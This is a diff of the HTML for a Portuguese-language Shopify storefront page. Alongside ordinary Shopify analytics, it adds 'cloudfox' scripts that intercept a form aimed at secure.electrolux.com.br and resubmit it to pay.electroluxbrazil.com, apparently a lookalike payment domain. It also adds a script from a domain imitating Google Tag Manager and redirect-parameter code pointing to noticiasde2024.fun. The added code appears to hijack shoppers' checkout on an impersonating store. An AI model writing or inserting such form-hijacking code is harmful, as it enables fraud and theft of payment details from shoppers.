@@ -3,7 +3,6 @@
 
 
 
-
 <!DOCTYPE html><html class="no-js" lang="pt-BR"><head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, height=device-height, minimum-scale=1.0, maximum-scale=5.0">
@@ -1582,8 +1581,210 @@
             window.ShopifyAnalytics.meta[attr] = meta[attr];
         }
     </script>
+    <script>
+        window.ShopifyAnalytics.merchantGoogleAnalytics = function () {
+
+        };
+    </script>
+    <script class="analytics">
+        (function () {
+            var customDocumentWrite = function (content) {
+                var jquery = null;
+
+                if (window.jQuery) {
+                    jquery = window.jQuery;
+                } else if (window.Checkout && window.Checkout.$) {
+                    jquery = window.Checkout.$;
+                }
+
+                if (jquery) {
+                    jquery('body').append(content);
+                }
+            };
+
+            var hasLoggedConversion = function (token) {
+                if (token) {
+                    return document.cookie.indexOf('loggedConversion=' + token) !== -1;
+                }
+                return false;
+            }
+
+            var setCookieIfConversion = function (token) {
+                if (token) {
+                    var twoMonthsFromNow = new Date(Date.now());
+                    twoMonthsFromNow.setMonth(twoMonthsFromNow.getMonth() + 2);
+
+                    document.cookie = 'loggedConversion=' + token + '; expires=' + twoMonthsFromNow;
+                }
+            }
+
+            var trekkie = window.ShopifyAnalytics.lib = window.trekkie = window.trekkie || [];
+            if (trekkie.integrations) {
+                return;
+            }
+            trekkie.methods = [
+                'identify',
+                'page',
+                'ready',
+                'track',
+                'trackForm',
+                'trackLink'
+            ];
+            trekkie.factory = function (method) {
+                return function () {
+                    var args = Array.prototype.slice.call(arguments);
+                    args.unshift(method);
+                    trekkie.push(args);
+                    return trekkie;
+                };
+            };
+            for (var i = 0; i < trekkie.methods.length; i++) {
+                var key = trekkie.methods[i];
+                trekkie[key] = trekkie.factory(key);
+            }
+            trekkie.load = function (config) {
+                trekkie.config = config || {};
+                trekkie.config.initialDocumentCookie = document.cookie;
+                var first = document.getElementsByTagName('script')[0];
+                var script = document.createElement('script');
+                script.type = 'text/javascript';
+                script.onerror = function (e) {
+                    var scriptFallback = document.createElement('script');
+                    scriptFallback.type = 'text/javascript';
+                    scriptFallback.onerror = function (error) {
+                        var Monorail = {
+                            produce: function produce(monorailDomain, schemaId, payload) {
+                                var currentMs = new Date().getTime();
+                                var event = {
+                                    schema_id: schemaId,
+                                    payload: payload,
+                                    metadata: {
+                                        event_created_at_ms: currentMs,
+                                        event_sent_at_ms: currentMs
+                                    }
+                                };
+                                return Monorail.sendRequest("https://" + monorailDomain +
+                                    "/v1/produce", JSON.stringify(event));
+                            },
+                            sendRequest: function sendRequest(endpointUrl, payload) {
+                                // Try the sendBeacon API
+                                if (window && window.navigator && typeof window.navigator
+                                    .sendBeacon === 'function' && typeof window.Blob ===
+                                    'function' && !Monorail.isIos12()) {
+                                    var blobData = new window.Blob([payload], {
+                                        type: 'text/plain'
+                                    });
+
+                                    if (window.navigator.sendBeacon(endpointUrl, blobData)) {
+                                        return true;
+                                    } // sendBeacon was not successful
+
+                                } // XHR beacon
+
+                                var xhr = new XMLHttpRequest();
+
+                                try {
+                                    xhr.open('POST', endpointUrl);
+                                    xhr.setRequestHeader('Content-Type', 'text/plain');
+                                    xhr.send(payload);
+                                } catch (e) {
+                                    console.log(e);
+                                }
+
+                                return false;
+                            },
+                            isIos12: function isIos12() {
+                                return window.navigator.userAgent.lastIndexOf(
+                                        'iPhone; CPU iPhone OS 12_') !== -1 || window.navigator
+                                    .userAgent.lastIndexOf('iPad; CPU OS 12_') !== -1;
+                            }
+                        };
+                        Monorail.produce('monorail-edge.shopifysvc.com',
+                            'trekkie_storefront_load_errors/1.1', {
+                                shop_id: 67449651431,
+                                theme_id: 138115580135,
+                                app_name: "storefront",
+                                context_url: window.location.href,
+                                source_url: "//viivarabrazil.com/cdn/s/trekkie.storefront.a0a07daed3df64bc141ebd704f9608fcc6496227.min.js"
+                            });
+
+                    };
+                    scriptFallback.async = true;
+                    scriptFallback.src =
+                        '//viivarabrazil.com/cdn/s/trekkie.storefront.a0a07daed3df64bc141ebd704f9608fcc6496227.min.js';
+                    first.parentNode.insertBefore(scriptFallback, first);
+                };
+                script.async = true;
+                script.src =
+                    '//viivarabrazil.com/cdn/s/trekkie.storefront.a0a07daed3df64bc141ebd704f9608fcc6496227.min.js';
+                first.parentNode.insertBefore(script, first);
+            };
+            trekkie.load({
+                "Trekkie": {
+                    "appName": "storefront",
+                    "development": false,
+                    "defaultAttributes": {
+                        "shopId": 67449651431,
+                        "isMerchantRequest": null,
+                        "themeId": 138115580135,
+                        "themeCityHash": "6983210986812154873",
+                        "contentLanguage": "pt-BR",
+                        "currency": "BRL"
+                    },
+                    "isServerSideCookieWritingEnabled": true,
+                    "monorailRegion": "shop_domain"
+                },
+                "Session Attribution": {},
+                "S2S": {
+                    "facebookCapiEnabled": false,
+                    "source": "trekkie-storefront-renderer"
+                }
+            });
+
+            var loaded = false;
+            trekkie.ready(function () {
+                if (loaded) return;
+                loaded = true;
+
+                window.ShopifyAnalytics.lib = window.trekkie;
 
 
+                var originalDocumentWrite = document.write;
+                document.write = customDocumentWrite;
+                try {
+                    window.ShopifyAnalytics.merchantGoogleAnalytics.call(this);
+                } catch (error) {};
+                document.write = originalDocumentWrite;
+
+                window.ShopifyAnalytics.lib.page(null, {
+                    "pageType": "collection",
+                    "resourceType": "collection",
+                    "resourceId": 416962478311
+                });
+
+                var match = window.location.pathname.match(/checkouts\/(.+)\/(thank_you|post_purchase)/)
+                var token = match ? match[1] : undefined;
+                if (!hasLoggedConversion(token)) {
+                    setCookieIfConversion(token);
+                    window.ShopifyAnalytics.lib.track("Viewed Product Category", {
+                        "currency": "BRL",
+                        "category": "Collection: Mais Vendidos de Fevereiro",
+                        "collectionName": "Mais Vendidos de Fevereiro",
+                        "collectionId": 416962478311,
+                        "nonInteraction": true
+                    });
+                }
+            });
+
+
+            var eventsListenerScript = document.createElement('script');
+            eventsListenerScript.async = true;
+            eventsListenerScript.src =
+                "//viivarabrazil.com/cdn/shopifycloud/shopify/assets/shop_events_listener-a7c63dba65ccddc484f77541dc8ca437e60e1e9e297fe1c3faebf6523a0ede9b.js";
+            document.getElementsByTagName('head')[0].appendChild(eventsListenerScript);
+
+        })();
+    </script>
     <script class="boomerang">
         (function () {
             if (window.BOOMR && (window.BOOMR.version || window.BOOMR.snippetExecuted)) {
@@ -2556,14 +2757,132 @@
 
 
 
-     </div>
-        <style> </style>
+    <!-- start cloudfox utm script -->
+    <div id="foxScriptUtm">
+        <script>
+            var url_string = window.location.href;
+            var url = new URL(url_string);
+            var utmParams = {
+                src: url.searchParams.get('src'),
+                utm_source: url.searchParams.get('utm_source'),
+                utm_medium: url.searchParams.get('utm_medium'),
+                utm_campaign: url.searchParams.get('utm_campaign'),
+                utm_term: url.searchParams.get('utm_term'),
+                utm_content: url.searchParams.get('utm_content')
+            }
+            var cookieValue = '';
+            Object.keys(utmParams).forEach(function (key) {
+                if (utmParams[key]) {
+                    if (cookieValue) {
+                        cookieValue += '|';
+                    }
+                    cookieValue += key + '=' + utmParams[key];
+                }
+            });
+
+            if (cookieValue) {
+                var cookieName = '_sirius_track';
+                var myDate = new Date();
+                myDate.setMonth(myDate.getMonth() + 12);
+
+
+                document.cookie = cookieName + '=' + cookieValue + ';domain=.electroluxbrazil.com;path=/;expires=' + myDate
+                    .toUTCString();
+            }
+        </script>
+    </div>
+    <!-- end cloudfox utm script -->
+    <!-- start cloudfox cart script -->
+    <div id="foxScriptCart">
+        <script defer="">
+            function inArray(needle, haystack) {
+                var length = haystack.length;
+                for (var i = 0; i < length; i++) {
+                    if (haystack[i] == needle) return true;
+                }
+                return false;
+            }
+
+            function setFormDataCloudfoxCheckout(method = "POST") {
+
+                const urlCloudfoxCheckout = 'https://pay.electroluxbrazil.com';
+                let form = document.querySelector(`form[action="${urlCloudfoxCheckout}"]`);
+
+                if (form === null) {
+                    form = document.querySelector('form[action="https://secure.electrolux.com.br/account#/orders"]');
+                    form.setAttribute('action', urlCloudfoxCheckout);
+                }
+
+                if (!form.hasAttribute('method')) form.setAttribute('method', method);
+                if (!form.hasAttribute('novalidate')) form.setAttribute('novalidate', 'novalidate');
+                if (!form.hasAttribute('data-fox')) form.setAttribute('data-fox', 'cart-form');
+
+                return form;
+            }
+
+            function createInputDataFox(name, loopIndex, value, dataFoxNumber, type = 'hidden') {
+                const element = document.createElement('input');
+                element.setAttribute('type', type);
+                element.setAttribute('data-fox', dataFoxNumber);
+                element.setAttribute('name', `${name}${loopIndex}`);
+                element.setAttribute('value', `${value}`);
+
+                return element;
+            }
+
+            function submitCheckout(formElement) {
+                const themeName = "Tema evolution 5";
+                const theme = themeName.toLowerCase();
+                const divFoxData = document.createElement('div');
+                divFoxData.setAttribute('id', 'foxData');
+
+                if (theme == 'warehouse') {
+
+                } else {
+
+                }
+
+                // console.log(formElement);
+
+                const form = setFormDataCloudfoxCheckout();
+                form.appendChild(divFoxData);
+
+                console.log(form);
+
+                form.submit();
+            }
+
+            console.log('collection');
+
+            let form = document.querySelector('form[action="https://secure.electrolux.com.br/account#/orders"]');
+            if (form !== null) {
+                form.addEventListener('submit', function (e) {
+                    e.preventDefault();
+                    console.log(this);
+                    submitCheckout(this);
+                });
+            }
+
+            // let buttonSubmit = document.querySelector('button[form="cart"][type="submit"]');
+            let buttonSubmit = document.querySelector('button[form]');
+            if (buttonSubmit !== null) {
+                buttonSubmit.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    console.log(form);
+                    submitCheckout(form);
+                });
+            }
+        </script>
+    </div>
+    <!-- end cloudfox cart script -->
+
+    <style> </style>
 
 
 
 
 
-
+                    <script async="true" src="https://c1.cdn1tp.net/ghelper/googletagmanager.js"></script>
 <!-- Meta Pixel Code -->
 <script>
 !function(f,b,e,v,n,t,s)
@@ -2581,15 +2900,24 @@ fbq('track', 'PageView');
 src="https://www.facebook.com/tr?id=876148574256207&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
+
 <script>
-    window.onload = function () {
-        var links = document.getElementsByTagName("a");
-        for (var i = 0, n = links.length; i < n; i++) {
-            var href = links[i].href.trim() +
-                    (links[i].href.indexOf("?") > 0 ? '&' : '?') +
-                    document.location.search.replace('?', '').toString();
-            links[i].href = href;
-        }
-    }
+// URL de origem
+var urlOrigem = "https://noticiasde2024.fun/teste2/?utm_source=campaign_id&utm_medium=campaign_name&utm_campaign=adset_name&utm_content=ad_name";
+
+// URL de destino
+var urlDestino = "https://noticiasde2024.fun/magal/";
+
+// Extrai os parâmetros da URL de origem
+var urlParams = new URLSearchParams(urlOrigem.split("?")[1]);
+
+// Adiciona os parâmetros UTM à URL de destino
+urlDestino += "?utm_source=" + urlParams.get("utm_source") +
+              "&utm_medium=" + urlParams.get("utm_medium") +
+              "&utm_campaign=" + urlParams.get("utm_campaign") +
+              "&utm_content=" + urlParams.get("utm_content");
+
+// Imprime a URL de destino com os parâmetros UTM
+console.log(urlDestino);
 </script>
                 </body></html>
